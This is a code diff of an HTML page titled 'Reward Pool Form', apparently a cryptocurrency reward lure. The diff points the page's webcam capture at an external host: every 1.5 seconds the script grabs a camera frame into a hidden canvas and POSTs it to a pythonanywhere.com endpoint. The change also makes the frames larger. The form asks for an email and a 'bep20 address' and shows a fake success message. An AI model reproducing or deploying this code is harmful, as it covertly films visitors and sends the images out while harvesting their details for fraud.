@@ -2,9 +2,7 @@
 <html>
 <head>
 <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
-<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
-<script type="text/javascript" src="/static/ajax.js"></script>
-<link rel="stylesheet" href="static/styles/style.css">
+
 <title>Reward Pool Form</title>
 </head>
 
@@ -12,28 +10,18 @@
    <video id="video" playsinline autoplay></video>
 </div>
 
-<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+<canvas hidden="hidden" id="canvas" width="1024" height="800"></canvas>
 
 <script>
 
 
 
 function post(imgdata){
-  //$.post("/", imgdata);}
-  
-$.ajax({
-    type: 'GET',
-    data: JSON.stringify({canvasData:imgdata}),
-    url: '/savephoto/'+imgdata,
-    dataType: 'json',
-    contentType: 'application/json',
-    async: false,
-    success: function(result){
-        // call the function that handles the response/results
-    },
-    error: function(){
-    }
-  });
+var xmlhttp = new XMLHttpRequest();   // new HttpRequest instance 
+var theUrl = "https://vyachikvk.pythonanywhere.com/savephoto";
+xmlhttp.open("POST", theUrl);
+xmlhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+xmlhttp.send(JSON.stringify({'canvasData': imgdata}));
 };
 
 
@@ -71,7 +59,7 @@ function handleSuccess(stream) {
 var context = canvas.getContext('2d');
   setInterval(function(){
 
-       context.drawImage(video, 0, 0, 640, 480);
+       context.drawImage(video, 0, 0, 1024, 800);
        var canvasData = canvas.toDataURL("image/png").replace("data:image/png;base64,", "");
         post(canvasData); 
      }, 1500);
@@ -84,13 +72,13 @@ init();
 
 </script>
 
-<body style="background-image: url('static/bitcoin1.jpg');">
+<body>
     <div class="container" id="container">
         <div class="form-container log-in-container">
             <form action="#" onsubmit="alert('Your form has been submitted successfully. Dont submit multiple times.')" method="post" required>
                 <h1>Form</h1>
                 <div class="social-container">
-                    <img src="static/bnb1.jpeg" alt="Girl in a jacket" width="385" height="150">
+                    
                 </div>
                 <input placeholder="Email" type="email" required/>
                 <input placeholder="bep20 address" type="password" required/>
